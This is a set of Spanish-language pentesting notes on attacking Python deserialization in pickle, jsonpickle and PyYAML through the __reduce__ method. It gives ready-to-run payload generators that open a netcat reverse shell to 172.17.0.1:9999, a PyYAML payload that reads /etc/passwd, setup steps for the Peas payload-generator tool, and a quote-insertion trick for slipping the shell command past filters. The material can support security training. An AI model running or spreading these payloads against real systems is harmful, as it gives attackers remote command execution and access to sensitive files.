Si nos encontraramos frente a un serial realizado con pickle o JSONPickle podríamos obtener rce aprovechando la función "__reduce__".

Documentación:

            https://docs.python.org/3/library/pickle.html#object.__reduce__

### PICKLE RCE

Reduce devuelve una tupla que comprende:
- Un objeto invocable que será llamado para crear la versión inicial del objeto
- Una tupla de argumentos para el objeto invocable.

Esto quiere decir que si el objeto se encuentra serializado, al momendo de la deserialización, si el objeto tiene definida la función  reduce, será usado para reestablecer el objeto original.

Podemos abusar de esto para que devuelva un objeto invocable con parametros de ejecución de comandos.

Podríamos crear una clase que llame a reduce pidiendole que ejecute comandos en el sistema y pasandole el comando dentro de la tupla:

                        import pickle
                        import base64
                        import os
                        
                        class RCE:
                            def __reduce__(self):
                                return os.system, ("nc -nv 172.17.0.1 9999 -e /bin/sh",)
                        
                        r = RCE()
                        p = pickle.dumps(r)
                        b = base64.b64encode(p)
                        print(b.decode())


### JSONPickle RCE

                        import jsonpickle
                        import os
                        
                        class RCE():
                          def __reduce__(self):
                            return os.system, ("nc -nv 172.17.0.1 9999 -e /bin/sh",)
                        
                        # Serialize (generate payload)
                        exploit = jsonpickle.encode(RCE())
                        print(exploit)


##### Contenidos extra sobre explotación de pickle y JSONPickle

                        https://davidhamann.de/2020/04/05/exploiting-python-pickle/
                        https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/

### PyYAML & ruamel.yaml

                        import yaml
                        import subprocess
                        
                        class RCE():
                          def __reduce__(self):
                            return subprocess.Popen(["head", "/etc/passwd"])
                        
                        # Serialize (Create the payload)
                        exploit = yaml.dump(RCE())
                        print(exploit)
                        
                        # Deserialize (vulnerable code)
                        yaml.load(exploit)

##### Contenidos extra en PyYAML & ruamel.yaml

                        https://net-square.com/yaml-deserialization-attack-in-python.html
                        https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf



### AUTOMATIZACIÓN

Peas es un script que nos permite automatizar los ataques con las diferentes librerías de serialización en python.

### Instalación

                        git clone https://github.com/j0lt-github/python-deserialization-attack-payload-generator.git
                        cd python-deserialization-attack-payload-generator/
                        pip3 install -r requirements.txt

##### USO

Solo con llamarlo, Peas nos hará una serie de preguntas para generar el payload.

                        python3 peas.py 



### Extra:

Podriamos encontrarnos tanto en blackbox como en whitebox que los objetos, al ser deserializados tengan filtros. Deberemos probar también medidas que permitan pasarlos. Ej:

Agregar las comillas entre los datos plausibles de ser eliminados por los filtos:

            n''c -nv 172.17.0.1 9999 -e /bin/s''h

Más info en el módulo de command injection de este repo
